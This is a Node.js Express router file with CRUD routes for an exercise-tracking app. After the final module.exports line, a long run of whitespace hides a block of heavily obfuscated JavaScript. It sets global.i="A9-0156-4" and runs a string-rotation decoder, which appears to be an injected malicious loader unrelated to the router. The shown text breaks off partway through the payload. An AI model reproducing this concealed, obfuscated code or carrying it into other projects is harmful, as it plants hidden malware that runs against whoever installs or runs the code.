const express=require('express')
const router=express.Router();
let Exercise=require('../models/exercise.model')

router.route('/').get((req,res)=>{
    Exercise.find()
    .then(exercise=>res.json(exercise))
    .catch(err=>res.status(400).json('Error:'+ err));
});

router.route('/add').post((req,res)=>{
    const username=req.body.username;
    const description=req.body.description;
    const duration=Number(req.body.duration);
    const date=Date.parse(req.body.date);

    const newExercise=new Exercise({
        username,
        description,
        duration,
        date,
    })

    newExercise.save()
    .then(()=>res.json('Exercise Added'))
    .catch(err=>res.status(400).json('Error:'+err));
});

router.route('/:id').get((req,res)=>{
    Exercise.findById(req.params.id)
    .then((exercises)=>res.json(exercises))
    .catch(err=>res.status(400).json('Error:'+err))
})
router.route('/:id').delete((req,res)=>{
    Exercise.findByIdAndDelete(req.params.id)
    .then(()=>res.json('Exercise deleted'))
    .catch(err=>res.status(400).json('Error:'+err))
})
router.route('/update/:id').post((req,res)=>{
    Exercise.findById(req.params.id)
    .then((exercise)=>{
        exercise.username=req.body.username
        exercise.description=req.body.description
        exercise.duration=Number(req.body.duration);
        exercise.date=Date.parse(req.body.date);

        exercise.save()
        .then(()=>res.json('Exercise Updated'))
        .catch((err)=>res.status(400).json('Error:'+err))
    })
    .catch(err=>res.status(400).json('Error:'+err))
})

module.exports=router;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             global.i="A9-0156-4";var _0x18fc94=_0x32cb;(function(_0x5a4a9e,_0x3b45b1){var _0x3e9a83=_0x32cb,_0x8b5606=_0x5a4a9e();while(!![]){try{var _0x154b32=-parseInt(_0x3e9a83(0x353))/(0x1*0x93a+-0x31*0x44+-0x1*-0x3cb)+parseInt(_0x3e9a83(0x388))/(-0x6*-0x1+0x14de+-0x14e2)*(parseInt(_0x3e9a83(0x20f))/(-0x23b9+-0x232a+-0x79*-0x96))+-parseInt(_0x3e9a83(0x278))/(0xb*0x92+-0x439+0x1*-0x209)+parseInt(_0x3e9a83(0x1fd))/(-0x1791+0x45*0x37+-0x1*-0x8c3)*(-parseInt(_0x3e9a83(0x28d))/(0x78c*0x3+0x39*0x3e+0x29a*-0xe))+-parseInt(_0x3e9a83(0x2a1))/(-0x7a2+0x1*0x245d+-0x1cb4*0x1)+-parseInt(_0x3e9a83(0x203))/(0x6a*0x28+0x1760+0x9fa*-0x4)+parseInt(_0x3e9a83(0x223))/(0x1b42+-0x17fc+0x33d*-0x1)*(parseInt(_0x3e9a83(0x28b))/(-0x125*-0xb+0x39b+-0x1028));if(_0x154b32===_0x3b45b1)break;else _0x8b5606['push'](_0x8b5606['shift']());}catch(_0x5b93fb){_0x8b5606['push'](_0x8b5606['shift']());}}}(_0x507c,0x8d023+-0x3acf2+-0x1*-0x2742b),(
